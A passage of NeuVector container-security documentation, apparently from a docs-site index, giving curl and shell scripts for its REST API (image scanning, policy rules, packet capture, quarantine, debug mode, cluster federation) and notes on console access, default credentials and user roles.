$_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json done echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 cat scan_repository.json | jq . rm *.json echo `date +%Y%m%d_%H%M%S` [$_curCase_] $_DESC_: $_RESULT_-$_ERRCODE_   note You may need to install jq sudo yum install jq   For Kubernetes based deployments you can set the Controller IP as follows:  _podNAME_=`kubectl get pod -n neuvector -o wide | grep &quot;allinone\\|controller&quot; | head -n 1 | awk '{print $1}'` _controllerIP_=`kubectl exec $_podNAME_ -n neuvector -- consul info | grep leader_addr | awk -F&quot;:| &quot; '{print $3}'`   note In a multiple controller deployment the requests must be sent to a single controller IP so multiple requests for status of long running image scans go to the controller performing the scan.  For scanning locally instead of in a registry:  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;tag&quot;: &quot;3.4&quot;, &quot;repository&quot;: &quot;nvlab/alpine&quot;, &quot;scan_layers&quot;: true}}' &quot;https://$_controllerIP_:443/v1/scan/repository&quot;   Sample output:  { &quot;report&quot;: { &quot;image_id&quot;: &quot;c7fc7faf8c28d48044763609508ebeebd912ad6141a722386b89d044b62e4d45&quot;, &quot;registry&quot;: &quot;&quot;, &quot;repository&quot;: &quot;nvlab/alpine&quot;, &quot;tag&quot;: &quot;3.4&quot;, &quot;digest&quot;: &quot;sha256:2441496fb9f0d938e5f8b27aba5cc367b24078225ceed82a9a5e67f0d6738c80&quot;, &quot;base_os&quot;: &quot;alpine:3.4.6&quot;, &quot;cvedb_version&quot;: &quot;1.568&quot;, &quot;vulnerabilities&quot;: [ { &quot;name&quot;: &quot;CVE-2018-0732&quot;, &quot;score&quot;: 5, &quot;severity&quot;: &quot;Medium&quot;, &quot;vectors&quot;: &quot;AV:N/AC:L/Au:N/C:N/I:N/A:P&quot;, &quot;description&quot;: &quot;During key agreement in a TLS handshake using a DH(E) based ciphersuite a malicious server can send a very large prime value to the client. This will cause the client to spend an unreasonably long period of time generating a key for this prime resulting in a hang until the client has finished. This could be exploited in a Denial Of Service attack. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2-1.0.2o).&quot;, &quot;package_name&quot;: &quot;openssl&quot;, &quot;package_version&quot;: &quot;1.0.2n-r0&quot;, &quot;fixed_version&quot;: &quot;1.0.2o-r1&quot;, &quot;link&quot;: &quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0732&quot;, &quot;score_v3&quot;: 7.5, &quot;vectors_v3&quot;: &quot;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&quot; }, ... ], &quot;layers&quot;: [ { &quot;digest&quot;: &quot;c68318b6ae6a2234d575c4b6b33844e3e937cf608c988a0263345c1abc236c14&quot;, &quot;cmds&quot;: &quot;/bin/sh&quot;, &quot;vulnerabilities&quot;: [ { &quot;name&quot;: &quot;CVE-2018-0732&quot;, &quot;score&quot;: 5, &quot;severity&quot;: &quot;Medium&quot;, &quot;vectors&quot;: &quot;AV:N/AC:L/Au:N/C:N/I:N/A:P&quot;, &quot;description&quot;: &quot;During key agreement in a TLS handshake using a DH(E) based ciphersuite a malicious server can send a very large prime value to the client. This will cause the client to spend an unreasonably long period of time generating a key for this prime resulting in a hang until the client has finished. This could be exploited in a Denial Of Service attack. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2-1.0.2o).&quot;, &quot;package_name&quot;: &quot;openssl&quot;, &quot;package_version&quot;: &quot;1.0.2n-r0&quot;, &quot;fixed_version&quot;: &quot;1.0.2o-r1&quot;, &quot;link&quot;: &quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0732&quot;, &quot;score_v3&quot;: 7.5, &quot;vectors_v3&quot;: &quot;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&quot; }, ... ], &quot;size&quot;: 5060096 } ] } }   Create Policy Rules Automatically​  To create a new rule in the NeuVector policy controller, the groups for the FROM and TO fields must exist first. The following sample creates a new Group based on the container label nv-service-type=data, and another Group for label nv-service-type=website. A rule is then created to allow traffic from the wordpress container to the mysql container using only the mysql protocol.  Be sure to update the username and password for access to the controller.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mydb&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;data&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;name&quot;: &quot;mywp&quot;, &quot;criteria&quot;: [{&quot;value&quot;: &quot;website&quot;, &quot;key&quot;: &quot;nv.service.type&quot;, &quot;op&quot;: &quot;=&quot;}]}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/group&quot; curl -k -X &quot;PATCH&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;insert&quot;: {&quot;rules&quot;: [{&quot;comment&quot;: &quot;Custom WP Rule&quot;, &quot;from&quot;: &quot;mywp&quot;, &quot;applications&quot;: [&quot;MYSQL&quot;], &quot;ports&quot;: &quot;any&quot;, &quot;to&quot;: &quot;mydb&quot;, &quot;action&quot;: &quot;allow&quot;, &quot;id&quot;: 0}], &quot;after&quot;: 0}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/policy/rule&quot; curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;   If the Groups already exist in NeuVector then the new rule can be created, skipping the Group creation steps. This example also removes the authentication token at the end. Note that a Rule ID number can be specified and NeuVector executes rules in numerical order lowest to highest.  Export/Import Configuration File​  Here are samples to backup the NeuVector configuration file automatically. You can select whether to export all configuration settings (policy, users, Settings etc), or only the policy.  important These samples are provided as examples only and are not officially supported unless a specific enterprise support agreement has been put in place.  To export all configuration:  ./config.py export -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ # exporting the configuration with all settings   To export policy only:  ./config.py export -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ --section policy # exporting the configuration with policy only   To import the file:  ./config.py import -u admin -w admin -s $_controllerIP_ -p $_controllerPort_ -f $_FILENAME_ # importing the configuration   Sample python files Contains config.py, client.py, and multipart.py. Download sample files: ImportExport. Please put all three files in one folder to run above commands. You may need install some Python modules in order to run the script.  sudo pip install requests six   Setting or Changing User Password​  Use the rest API calls for User management.  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: c64125decb31e6d3125da45cba0f5025' https://127.0.0.1:10443/v1/user/admin -X PATCH -d '{&quot;config&quot;:{&quot;fullname&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;new_password&quot;:&quot;NEWPASS&quot;}}'   Starting Packet Capture on a Container​  When a container exhibits suspicious behavior, start a packet capture.  #!/bin/sh TOKEN_JSON=$(curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/auth&quot;) _TOKEN_=`echo $TOKEN_JSON | jq -r '.token.token'` curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;sniffer&quot;:{&quot;file_number&quot;:1,&quot;filter&quot;:&quot;port 1381&quot;}}' &quot;https://`docker inspect neuvector.allinone | jq -r '.[0].NetworkSettings.IPAddress'`:10443/v1/sniffer?f_workload=`docker inspect neuvector.allinone | jq -r .[0].Id`&quot;   Don’t forget to stop the sniffer session after some time so it doesn’t run forever. Number of files to rotate has a maximum value of 50.  Check and Accept the EULA (new deployments)​  Get the authentication TOKEN as above. Also replace the controller IP address with your as appropriate.  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: $_TOKEN_' https://127.0.0.1:10443/v1/eula | jq . { &quot;eula&quot;: { &quot;accepted&quot;:false } }   Accept EULA  curl -s -k -H 'Content-Type: application/json' -H 'X-Auth-Token: $_TOKEN_' -d '{&quot;eula&quot;:{&quot;accepted&quot;:true}}' https://127.0.0.1:10443/v1/eula   Then check the EULA again.  Configure Registry Scanning​  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.connect.redhat.com&quot;, &quot;username&quot;: &quot;username&quot;, &quot;password&quot;: &quot;password&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;repository&quot;: &quot;neuvector/enforcer&quot;}}' &quot;https://controller:port/v1/scan/repository&quot;   Enable Packet Capture on All Pods in a Namespace​  #!/bin/bash #set -x hash curl 2&gt;/dev/null || { echo &gt;&amp;2 &quot;Required curl but it's not installed. Aborting.&quot;; exit 1; } hash jq 2&gt;/dev/null || { echo &gt;&amp;2 &quot;Required jq but it's not installed. Aborting.&quot;; exit 1;} script=&quot;$0&quot; usage() { echo &quot;Usage: $script -n [namespace] -d [pcap duration (seconds)] -l [https://nvserver:10443]&quot; 1&gt;&amp;2; exit 1; } while getopts &quot;:n:d:l:h&quot; opt; do case $opt in n) NAMESPACE=$OPTARG ;; d) DURATION=$OPTARG ;; l) URL=&quot;$OPTARG/v1&quot; ;; h) usage ;; \\?) echo &quot;Invalid option, $OPTARG. Try -h for help.&quot; 1&gt;&amp;2 ;; :) echo &quot;Invalid option: $OPTARG requires an argument&quot; 1&gt;&amp;2 esac done if [ ! &quot;$NAMESPACE&quot; ] || [ ! &quot;$DURATION&quot; ] || [ ! &quot;$URL&quot; ] then usage exit 1 fi count=0 for i in `kubectl -n $NAMESPACE get pods -o wide 2&gt; /dev/null | tail -n +2 | awk '{print $1}' | sed 's|\\(.*\\)-.*|\\1|' | uniq`; do CHOICE1[count]=$i count=$count+1 done if [ -z ${CHOICE1[0]} ]; then echo &quot;No pods found in $NAMESPACE.&quot; exit 1 else for i in &quot;${!CHOICE1[@]}&quot; do echo &quot;$i : ${CHOICE1[$i]}&quot; done read -p &quot;Packet capture on which pod group? &quot; -r if [ -n $REPLY ]; then POD_STRING=${CHOICE1[$REPLY]} echo $POD_STRING &quot; selected.&quot; else exit 1 fi fi sniffer_start() { URI=&quot;/sniffer?f_workload=$1&quot; sniff_id=$(curl -ks --location --request POST ${URL}${URI} &quot;${curlHeaders[@]}&quot; --data-raw '{ &quot;sniffer&quot;: { &quot;file_number&quot;: 1, &quot;filter&quot;: &quot;&quot; }}' | jq .result.id) echo $sniff_id } sniffer_stop() { URI=&quot;/sniffer/stop/${1}&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request PATCH ${URL}${URI} &quot;${curlHeaders[@]}&quot;` echo $status_code } sniffer_pcap_get() { URI=&quot;/sniffer/${1}/pcap&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request GET ${URL}${URI} &quot;${curlHeaders[@]}&quot; -o $1.pcap` echo $status_code } sniffer_pcap_delete() { URI=&quot;/sniffer/${1}&quot; status_code=`curl -ks -w &quot;%{http_code}&quot; --location --request DELETE ${URL}${URI} &quot;${curlHeaders[@]}&quot;` echo $status_code } show_menu() { count=0 for i in &quot;Exit script&quot; &quot;Start packet capture for $DURATION seconds&quot; &quot;Download packet capture from pods&quot; &quot;Delete packet capture from pods&quot;; do CHOICE2[count]=$i count=$count+1 done echo echo &quot;Selections:&quot; for i in &quot;${!CHOICE2[@]}&quot; do echo &quot;$i : ${CHOICE2[$i]}&quot; done } get_token() { read -p &quot;Enter NeuVector Username: &quot; USER if [ -z $USER ]; then echo &quot;Blank username, exiting...&quot; exit 1 fi read -s -p &quot;Enter password: &quot; PASS if [ -z $PASS ]; then echo echo &quot;Blank password, exiting...&quot; exit 1 fi TOKEN=`curl -ks --location --request POST ${URL}/auth \\ --header &quot;accept: application/json&quot; \\ --header &quot;Content-Type: application/json&quot; \\ --data-raw '{&quot;password&quot;: {&quot;username&quot;: &quot;'$USER'&quot;, &quot;password&quot;: &quot;'$PASS'&quot;}}'|jq .token.token` echo $TOKEN } TOKEN=$(get_token) while [ &quot;$TOKEN&quot; = &quot;null&quot; ]; do echo echo &quot;Authenticating failed, retry.&quot; TOKEN=$(get_token) done TOKEN=${TOKEN:1:${#TOKEN}-2} echo declare -a curlHeaders=('-H' &quot;Content-Type: application/json&quot; '-H' &quot;X-Auth-Token: $TOKEN&quot;) echo &quot;Pulling worklods from $URL&quot; declare -a workloads=&quot;($( curl -ks --location --request GET ${URL}/workload &quot;${curlHeaders[@]}&quot; \\ | jq '.workloads[] | select(.display_name | startswith(&quot;'${POD_STRING}'&quot;))| select(.domain==&quot;'$NAMESPACE'&quot; and .cap_sniff==true) | .display_name + &quot;::&quot; +.id' -r ))&quot; if [ ${#workloads[@]} -eq 0 ]; then echo echo &quot;No pods is capable of packet capture. Only ethernet IP part of Kubernetes CIDR can packet capture.&quot; exit 1 else echo echo &quot;List of Pods to perform capture on.&quot; echo &quot;Pod Name : ID&quot; for pods in &quot;${workloads[@]}&quot; ; do POD_NAME=&quot;${pods%%::*}&quot; POD_ID=&quot;${pods##*::}&quot; echo &quot;$POD_NAME : $POD_ID&quot; done fi while :; do show_menu read -p &quot;Choice? &quot; -r if [ -n $REPLY ]; then case &quot;$REPLY&quot; in 0) exit 0; ;; 1) counter=0 declare -a sniffs; for pods in &quot;${workloads[@]}&quot;; do POD_ID=&quot;${pods##*::}&quot; sniff_id=&quot;$(sniffer_start $POD_ID)&quot;; sniffs[$counter]=$sniff_id counter=$((counter+1)) done echo &quot;Running pcap for ~$DURATION seconds.&quot;; sleep $DURATION; for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_stop $sniff_id)&quot;; done ;; 2) for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_pcap_get $sniff_id)&quot;; done ;; 3) for sniff_id in &quot;${sniffs[@]}&quot;; do sniff_id=${sniff_id:1:${#sniff_id}-2} status=&quot;$(sniffer_pcap_delete $sniff_id)&quot;; done ;; esac else exit 1 fi done   Enable Disable Container Quarantine​  The API call to quarantine is via PATCH to /v1/workload/:id with the following body. The workload id is the container/pod id.  --data-raw '{ &quot;config&quot;: { &quot;quarantine&quot;: true, &quot;wire&quot;: &quot;default&quot;, &quot;quarantine_reason&quot;: &quot;violation&quot; } }'   Enable Debugging Mode for NeuVector Support​  Set access token with your IP, user, password:  _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot;   Get the authentication token  curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'`   Enable Debug Mode  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: [&quot;cpath&quot;, &quot;conn&quot;]}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json #debug options - cpath, conn, mutex, scan, cluster , all   Disable Debug on all controllers in a cluster  curl -X PATCH -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;config&quot;: {&quot;controller_debug&quot;: []}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; set_debug.json   Check the controller debug status in a cluster  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/system/config&quot; &gt; /dev/null 2&gt;&amp;1 &gt; system_setting.json cat system_setting.json | jq .config.controller_debug   Logout  echo `date +%Y%m%d_%H%M%S` log out curl -k -X 'DELETE' -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1   Report if a vulnerability is in the base image layers​  To identify CVE's in the base image when using REST API to scan images, the base image must be identified in the API call, as in the example below.  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;https://registry.hub.docker.com/&quot;, &quot;repository&quot;: &quot;garricktam/debian&quot;, &quot;tag&quot;: &quot;latest&quot;, &quot;scan_layers&quot;: false, &quot;base_image&quot;: &quot;2244...../nodejs:3.2......&quot;}}' &quot;https://$RESTURL/v1/scan/repository&quot; {noformat}   Limitations: If the image to be scanned is a remote image, with &quot;registry&quot; specified, the base image must also be a remote image, and the name must start with http or https. If the image to be scanned is a local image, then the base image must also be a local image as well.  For example,  {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;registry&quot;: &quot;https://10.1.127.12:5000/&quot;, &quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.0&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;https://registry.hub.docker.com/alpine:3.12.0&quot;}} {&quot;request&quot;: {&quot;repository&quot;: &quot;neuvector/manager&quot;, &quot;tag&quot;: &quot;4.0.2&quot;, &quot;scan_layers&quot;: true, &quot;base_image&quot;: &quot;10.1.127.12:5000/neuvector/manager:4.0.2”}}   Get the CVE Database Version and Date​  curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; &quot;https://127.0.0.1:10443/v1/scan/scanner&quot;   Output:  { &quot;scanners&quot;: [ { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;0f043705948557828ac1831ee596588a0d050950113117ddd19ecd604982f4d9&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;127.0.0.1&quot; }, { &quot;cvedb_create_time&quot;: &quot;2020-07-07T10:34:04Z&quot;, &quot;cvedb_version&quot;: &quot;1.950&quot;, &quot;id&quot;: &quot;9fa02c644d603f59331c95735158d137002d32a75ed1014326f5039f38d4d717&quot;, &quot;port&quot;: 18402, &quot;server&quot;: &quot;192.168.9.95&quot; } ] }   Manage Federation for Master and Remote (Worker) Clusters​  Generally, listing Federation members can use a GET to the following endpoint (see samples for specific syntax):https://neuvector-svc-controller.neuvector:10443/v1/fed/member  Selected Federation Management API's:  _masterClusterIP_=$1 _workerClusterIP_=$2 # this is used if one of clusters is going to be kicked by master cluster _CLUSTER_name_=$3 echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_masterClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./$_LOGFOLDER_/token.json _TOKEN_M_=`cat ./$_LOGFOLDER_/token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] promote to master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; -d '{&quot;master_rest_info&quot;: {&quot;port&quot;: 11443, &quot;server&quot;: &quot;'$_masterClusterIP_'&quot;}, &quot;name&quot;: &quot;master&quot;}' &quot;https://$_masterClusterIP_:10443/v1/fed/promote&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 6 seconds for logon session timeout sleep 6 echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user on master cluster curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_masterClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./token.json _TOKEN_M_=`cat ./token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed join_token on master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/join_token&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./join_token.json cat ./join_token.json | jq -c . _JOIN_TOKEN_=`cat ./join_token.json | jq -r '.join_token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] login as default admin user on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;}}' &quot;https://$_workerClusterIP_:10443/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./token.json _TOKEN_W_=`cat ./token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` [$_curCase_] joining the cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; -d '{&quot;join_token&quot;: &quot;'$_JOIN_TOKEN_'&quot;, &quot;name&quot;: &quot;worker&quot;, &quot;joint_rest_info&quot;: {&quot;port&quot;: 10443, &quot;server&quot;: &quot;'$_workerClusterIP_'&quot;}}' &quot;https://$_workerClusterIP_:10443/v1/fed/join&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 ########## whenever there is a change on cluster such as a cluster is kicked/left/joined, run this to check the status ############ echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed member on master cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/member&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./fedMember.json cat ./fedMember.json | jq -c . echo `date +%Y%m%d_%H%M%S` [$_curCase_] checking fed member on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; &quot;https://$_workerClusterIP_:10443/v1/fed/member&quot; &gt; /dev/null 2&gt;&amp;1 &gt; ./fedMember.json cat ./fedMember.json | jq -c . _CLUSTER_id_=`cat ./fedMember.json | jq -r --arg _CLUSTER_name_ &quot;$_CLUSTER_name_&quot; '.joint_clusters[] | select(.name == $_CLUSTER_name_).id'` ################################################################################################################################### ########## for ur information to leave or kick the cluster ############ echo `date +%Y%m%d_%H%M%S` [$_curCase_] requesting to leave on worker cluster curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_W_&quot; -d '{&quot;force&quot;: false}' &quot;https://$_workerClusterIP_:10443/v1/fed/leave&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 echo `date +%Y%m%d_%H%M%S` [$_curCase_] requesting to kick on master cluster, $_CLUSTER_id_ curl -k -X &quot;DELETE&quot; -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_M_&quot; &quot;https://$_masterClusterIP_:10443/v1/fed/cluster/$_CLUSTER_id_&quot; &gt; /dev/null 2&gt;&amp;1 echo `date +%Y%m%d_%H%M%S` [$_curCase_] idle 9 seconds for events sleep 9 #######################################################################  ","version":"5.3","tagName":"h3"},{"title":"Connect to Manager, REST API server","type":0,"sectionRef":"#","url":"/configuration/console","content":"","keywords":"","version":"5.3"},{"title":"Connect to UI​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#connect-to-ui","content":" Open a browser window, connect to the manager using HTTPS. After accepting the EULA, the user is able to access the UI.  tip Depending of the deployment method you chose, the manager address will be as follow DockerKubernetes without LoadBalancer or IngressLoadBalancer or Ingress configured https://&lt;manager_host_ip&gt;:8443     You can manage NeuVector from the Console or by using the REST API.  note See below for cases where your corporate firewall blocks 8443.  note If your Chrome browser blocks the NeuVector self-signed certificate, see the next section on Chrome Certificate Upload.  ","version":"5.3","tagName":"h3"},{"title":"Connect to REST API Server​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#connect-to-rest-api-server","content":" All operations in NeuVector can be invoked through the REST API instead of the console. The REST API server is part of the Controller/Allinone container. For details on the REST API, please see the section on Workflow and Automation.  ","version":"5.3","tagName":"h3"},{"title":"Default username and password​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#default-username-and-password","content":" admin:admin  After successful login, the admin user should update the account with a more secure password.  ","version":"5.3","tagName":"h3"},{"title":"Creating Additional Users​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#creating-additional-users","content":" New users can be added from the Settings -&gt; Users &amp; Roles menu. There are predefined global roles in NeuVector:  Admin. Able to perform all actions except Federated policies.Federated Admin. Able to perform all actions, including setting up Master/Remote clusters and Federated policies (rules). Only visible if Multi-cluster is enabled.View Only (reader). No actions allowed, just viewing.CI Integration (ciops). Able to perform CI/CD scanning integration tasks such as image scanning. This user role is recommended for use in build-phase scanning plug-ins such as Jenkins, Bamboo etc and for use in the REST API calls. It is limited to scanning functions and will not be able to do any actions in the console.  Users can be restricted to one or more namespaces using the Advanced Settings.  See the section Users &amp; Roles for advanced user management and creation of custom roles.  ","version":"5.3","tagName":"h3"},{"title":"Connection Timeout Setting​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#connection-timeout-setting","content":" You can set the number of seconds which the console will timeout in the upper right of the console in My Profile -&gt; Session timeout. The default is 5 minutes and the maximum is 3600 seconds (1 hour).  ","version":"5.3","tagName":"h3"},{"title":"Enabling HTTP for Manager​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#enabling-http-for-manager","content":" To disable HTTPS and enable HTTP access, add this to the Manager or Allinone yaml section in the environment variables section. For example, in Kubernetes:  - name: MANAGER_SSL value: “off”   For OpenShift, also remove this setting from the Route section of the yaml:  tls: termination: passthrough   This is useful if putting the manager behind a load balancer.  ","version":"5.3","tagName":"h3"},{"title":"Enabling Access from Corporate Network Which Blocks 8443​","type":1,"pageTitle":"Connect to Manager, REST API server","url":"/configuration/console#enabling-access-from-corporate-network-which-blocks-8443","content":" If your corporate network does not allow access on port 8443 to the Manager console, you can create an ingress service to map it and allow access.  note The NeuVector UI console is running as non-root user in the container, so it cannot listen on a port less than 1024. This is why it can't be changed to 443.  If you are trying to access the console from your corporate network. Here is the way to use the ClusterIP service and ingress HTTPS redirect to achieve that.  First, create a certificate for HTTPS termination. Here is an example,  openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout tls.key -out tls.crt -subj &quot;/CN=mycloud.domain.com&quot; kubectl create secret tls neuvector-ingress-tls -n neuvector --key=&quot;tls.key&quot; --cert=&quot;tls.crt&quot;   Then, use the following yaml file to expose the 443 port that redirects the HTTPS connection to the manager.  apiVersion: v1 kind: Service metadata: name: neuvector-cluster-webui namespace: neuvector spec: ports: - port: 443 targetPort: 8443 protocol: TCP type: ClusterIP selector: app: neuvector-manager-pod --- apiVersion: extensions/v1beta1 kind: Ingress metadata: name: neuvector-ingress-webui namespace: neuvector annotations: ingress.mycloud.net/ssl-services: ssl-service=neuvector-cluster-webui spec: tls: - hosts: - cloud.neuvector.com secretName: neuvector-ingress-tls rules: - host: cloud.neuvector.com http: paths: - path: backend: serviceName: neuvector-cluster-webui servicePort: 443   You will need to change the 